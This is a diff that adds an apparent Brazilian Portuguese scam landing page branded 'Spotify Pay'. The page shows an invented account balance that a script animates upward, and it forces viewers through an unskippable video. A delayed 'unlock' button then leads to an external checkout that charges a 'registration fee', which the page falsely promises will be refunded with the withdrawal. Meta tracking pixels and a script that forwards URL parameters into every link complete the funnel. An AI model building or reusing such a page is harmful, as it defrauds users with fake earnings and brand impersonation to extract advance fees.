@@ -1,0 +1,349 @@
+﻿<!DOCTYPE html><html lang="pt-BR"><head>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '947203103507544');
+fbq('init', '525995430593179');
+fbq('init', '1244816270149408');
+fbq('init', '1297234251325878');
+fbq('init', '909564211265979');
+fbq('track', 'PageView');
+</script>
+<!-- End Meta Pixel Code -->
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link data-optimized="1" rel="stylesheet" href="css/5921624bf5bbe4c8c091ef09226fa76f.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link data-optimized="1" href="css/1c7a3d2ee9759dc256d915300855c494.css" rel="stylesheet">
+    <link data-optimized="1" href="css/ba9cbbe9240a489628be8eb27c56db8a.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/slider.css">
+    <link rel="stylesheet" href="css/animated.css">
+    <link rel="shortcut icon" href="images/faveicon.png">
+    <link rel="stylesheet" href="css/notiflix-3.2.5.min.css">
+    <link rel="stylesheet" href="../../css2?family=Montserrat:wght@400;700&display=swap">
+    <title>Spotify Pay</title>
+
+    <style>
+    body {
+        padding-bottom: 100px;
+    }
+    /* SALDO FUNIL */
+.boxSaldo {
+    width: auto;
+    height: 40px;
+    border: 2px solid #1ed760; /* Borda branca */
+    margin-right: 25px;
+    margin-top: 7px;
+    border-radius: 6px;
+    padding: 0 20px 0 10px;
+    position: relative;
+    float: right;
+    box-shadow: none; /* Remove qualquer sombra que possa estar interferindo */
+}
+
+/* Certifique-se de que não há estilos de hover ou foco que mudem a cor */
+.boxSaldo:hover,
+.boxSaldo:focus {
+    border: 2px solid #ffffff; /* Mantém a borda branca no hover/foco */
+}
+
+.textoSaldo {
+    font-size: 10px;
+    color: #000000;
+    font-weight: 700;
+    position: relative;
+    top: -14px;
+    margin: 0 0 0 9px;
+    padding: 1px 5px;
+    background: #FFFFFF;
+    width: fit-content;
+}
+
+.valorSaldo {
+    margin: -17px 0 0 12px;
+    font-family: 'PoppinsSemiBold'; 
+    color: #000000;
+}
+
+.saldoAnimado {
+    -webkit-animation: bounceIn 3.5s ease;
+}
+/* SALDO FUNIL */
+        /* Estilo da barra de progresso */
+        .progress-container {
+            width: 100%;
+            background-color: #f3f3f3;
+            overflow: hidden;
+            margin-bottom: 10px;
+            margin-top: -10px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 30px;
+            background-color: #1ed760;
+            text-align: center;
+            line-height: 30px;
+            color: black;
+            transition: width 1s ease-in-out;
+        }
+
+        /* Estilo do botão */
+        .centralizar {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        button {
+            background-color: #1ed760;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            width: 95%;
+            max-width: 400px; /* Tamanho máximo para telas grandes */
+            height: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.3);
+            display: none; /* Oculta o botão inicialmente */
+            animation: pulse 1.5s infinite; /* Animação pulsante */
+        }
+
+        /* Animação de pulse */
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        /* Estilo do cabeçalho */
+        .header {
+            background-color: red;
+            color: white;
+            font-family: 'Montserrat', sans-serif;
+            font-weight: bold;
+            padding: 10px;
+            text-align: center;
+            position: relative;
+            z-index: 1000;
+            font-size: 16px;
+            /* Tamanho padrão */
+        }
+
+        .header span {
+            font-weight: 600;
+            /* Semibold */
+        }
+
+        /* Estilo para dispositivos móveis */
+        @media (max-width: 768px) {
+            .header {
+                font-size: 14px;
+                /* Tamanho reduzido para telas menores */
+                padding: 8px;
+                /* Menos padding para ajustar em telas menores */
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                font-size: 12px;
+                /* Tamanho ainda menor para smartphones */
+                padding: 6px;
+                /* Ajustar padding para smartphones */
+            }
+        }
+    </style>
+</head>
+
+<body class="fundoWhite">
+    <!-- Cabeçalho -->
+    <div class="header">
+        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
+    </div>
+    <div id="p1" style="background-color: #FFFFFF; padding: 15px 0 0 0; border-bottom: 1px solid #202020; box-shadow: 0 2px 15px rgba(0, 0, 0, 0.3);">
+        <img style="width: 17%; margin: auto; margin-left: 50px; position: relative; margin-top: -2px;" src="images/spotify2-logo.png">
+        <div class="boxSaldo">
+            <label for="input" class="textoSaldo" style="background-color: #fff;">SALDO</label>
+            <p class="valorSaldo">R$ <span class="saldoAtualizado">492.98</span></p>
+        </div>
+    </div>
+
+    <div id="produto1" style="width: 100%;">
+        <div style="text-align: center; display: flex; padding: 10px; justify-content: center; align-items: center; flex-direction: column; align-content: center; flex-wrap: wrap; position: relative;">
+
+            <img src="images/vsl.gif" width="150" height="150" alt="" srcset="">
+            <h4>DESBLOQUEIO DE SALDO.</h4>Veja como Liberar seu Saque!<br><br>
+
+            <style>
+                #video-container {
+                    position: relative;
+                    width: 100%;
+                    max-width: 800px;
+                }
+                video {
+                    width: 100%;
+                    height: auto;
+                    display: block;
+                    pointer-events: none; /* Impede que o usuário interaja com a barra de progresso */
+                }
+                #alerta {
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background-color: rgba(0, 0, 0, 0.7); /* Camada escura transparente */
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    color: white;
+                    font-size: 24px;
+                    font-weight: bold;
+                    cursor: pointer;
+                    text-align: center;
+                }
+                @media (max-width: 600px) {
+                    #alerta {
+                        font-size: 18px; /* Texto menor para telas menores */
+                    }
+                }
+            </style>
+
+            <div id="video-container">
+                <video id="video" muted="" playsinline="" disablepictureinpicture="" controlslist="nodownload noremoteplayback nodownload" controls="">
+                    <source src="media/video.mp4" type="video/mp4">
+                    Seu navegador não suporta a tag de vídeo.
+                </video>
+                <div id="alerta">Clique aqui para ativar o som</div>
+            </div>
+
+            <script>
+                const video = document.getElementById('video');
+                const alerta = document.getElementById('alerta');
+            
+                // Toca o vídeo automaticamente, mutado
+                video.play();
+            
+                // Impede que o usuário avance ou volte o vídeo
+                video.addEventListener('timeupdate', () => {
+                    if (video.currentTime > 0 && !video.muted) {
+                        video.removeAttribute('controls'); // Remove os controles após desmutar
+                    } else {
+                        video.setAttribute('controls', 'controls'); // Habilita controles mutados inicialmente
+                    }
+                });
+            
+                // Evento ao clicar na camada de alerta
+                alerta.addEventListener('click', () => {
+                    video.currentTime = 0;  // Reinicia o vídeo
+                    video.muted = false;    // Desmuta o vídeo
+                    video.play();           // Toca o vídeo
+                    alerta.style.display = 'none';  // Remove o alerta
+                    video.removeAttribute('controls'); // Remove controles após desmutar
+                });
+            
+                // Previne que o vídeo seja baixado ou que o PiP (Picture in Picture) seja ativado
+                video.addEventListener('contextmenu', (e) => e.preventDefault());
+            </script>
+
+            <br>
+                <span style="font-size: 12px; color: green;">(O valor da Taxa será Reembolsado junto do seu Saque
+                    Total).</span>
+            <p></p>
+
+            <div class="centralizar">
+                <a href="https://pagamentoseguro.segurospag.store/hkQjp2/checkout/taxa-de-inscricao" style="width: 100%;">
+                    <button id="meuBotao">DESBLOQUEAR AGORA</button>
+                </a>
+            </div>
+
+        </div>
+    </div>
+
+    <script src="js/notiflix-3.2.5.min.js"></script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // Função para mostrar o botão após 3 segundos (3000 milissegundos)
+            setTimeout(function() {
+                document.getElementById("meuBotao").style.display = "block";
+            }, 10000);
+
+            // Animação de atualização do saldo
+            const saldoElemento = document.querySelector('.saldoAtualizado');
+            const saldoFinal = 473.00;
+            const saldoInicial = 100.00;
+            const duracao = 1000; // Duração total em milissegundos
+            const passos = 100; // Número de passos na animação
+            const incremento = (saldoFinal - saldoInicial) / passos;
+            const tempo = duracao / passos;
+
+            let saldoAtual = saldoInicial;
+
+            function atualizarSaldo() {
+                saldoAtual += incremento;
+                saldoElemento.textContent = saldoAtual.toFixed(2);
+
+                if (saldoAtual < saldoFinal) {
+                    setTimeout(atualizarSaldo, tempo);
+                } else {
+                    saldoElemento.textContent = saldoFinal.toFixed(2);
+                }
+            }
+
+            atualizarSaldo();
+        });
+    </script>
+    
+    <script>
+    (function() {
+    // Função para obter os parâmetros da URL como string
+    function getURLParameters() {
+        const queryString = window.location.search;
+        return queryString ? queryString.substring(1) : '';
+    }
+
+    // Função para adicionar parâmetros aos links
+    function updateLinks() {
+        const params = getURLParameters();
+        if (!params) return; // Se não houver parâmetros, não faz nada
+
+        const links = document.querySelectorAll('a[href]');
+        links.forEach(link => {
+            const url = new URL(link.href, window.location.origin);
+
+            // Verifica se os parâmetros já estão no link
+            if (!url.search.includes(params)) {
+                url.search += (url.search ? '&' : '') + params;
+                link.href = url.toString();
+            }
+        });
+    }
+
+    // Executa a cada 300ms
+    setInterval(updateLinks, 300);
+})();
+</script>
+    
+
+
+
+</body></html>
